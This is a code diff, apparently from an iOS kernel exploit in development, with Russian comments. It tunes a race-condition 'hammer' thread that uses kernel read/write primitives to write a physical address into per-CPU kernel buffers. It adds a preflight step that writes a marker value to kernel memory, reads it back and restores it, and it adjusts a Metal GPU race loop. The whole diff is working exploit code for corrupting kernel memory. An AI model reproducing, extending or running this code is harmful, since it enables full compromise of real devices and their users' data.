@@ -5338,7 +5338,7 @@ static void *kpRaceHammer(void *arg)
     (void)arg;
     while (!gRaceStop) {
         for (int n = 0; n < gRaceN; n++)
-            for (int i = 0; i < 8; i++)
+            for (int i = 0; i < 4; i++)
                 kp_rc_kwrite64(gRaceBufs[n] + (uint64_t)i * 0x10, gRacePA);
     }
     return NULL;
@@ -5412,9 +5412,24 @@ static void *kpRaceHammer(void *arg)
     GNOTE( [NSString stringWithFormat:@"  сентинель: VA=%#llx paX=%#llx маркер=0x4142434445464748", (uint64_t)sva, paX]);
     if (!paX) { GNOTE( @"FAIL: vtophys(sentinel)"); goto out_s; }
 
-    // 3. молотилка
+    // 3. ПРЕФЛАЙТ: одна запись в cpu0-bufVA (доказанный 1.9.79) → readback →
+    //    restore. Доказывает записываемость ТОЧНОЙ цели на этом буте; если
+    //    девайс умрёт здесь — запись в лист фатальна сама по себе.
+    extern void kp_rc_kwrite64(uint64_t, uint64_t);
+    {
+        uint64_t orig = kp_rc_kread64(bufVAs[0]);
+        kp_rc_kwrite64(bufVAs[0], 0x4141414141414141ULL);
+        uint64_t rb = kp_rc_kread64(bufVAs[0]);
+        kp_rc_kwrite64(bufVAs[0], orig);
+        uint64_t rb2 = kp_rc_kread64(bufVAs[0]);
+        GNOTE( [NSString stringWithFormat:@"  префлайт cpu0-bufVA: %@ (rb=%#llx restore=%#llx)", rb == 0x4141414141414141ULL ? @"ПИШЕТСЯ ✓" : @"НЕ ПРИЛИПЛО", rb, rb2]);
+        if (rb != 0x4141414141414141ULL) { GNOTE( @"СТОП: цель не пишется"); goto out_s; }
+    }
+
+    // 3b. молотилка — ТОЛЬКО cpu0-bufVA, первые 4 записи (cpu1+ только в логе,
+    //     stride 0x6eb0 для них не подтверждён — писать туда = русская рулетка)
     memcpy(gRaceBufs, bufVAs, sizeof(bufVAs));
-    gRaceN = ncpu; gRacePA = paX; gRaceStop = 0;
+    gRaceN = 1; gRacePA = paX; gRaceStop = 0;
     {
         pthread_t ht;
         pthread_create(&ht, NULL, kpRaceHammer, NULL);
@@ -5430,7 +5445,7 @@ static void *kpRaceHammer(void *arg)
         id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
         if (!q) { GNOTE( [NSString stringWithFormat:@"FAIL: Metal pipeline: %@", err]); gRaceStop = 1; pthread_join(ht, NULL); goto out_s; }
         int hits = 0, weird = 0;
-        for (int it = 0; it < 3000 && !hits; it++) {
+        for (int it = 0; it < 1500 && !hits; it++) {
             @autoreleasepool {
                 id<MTLBuffer> sb = [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
                 id<MTLBuffer> rb = [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
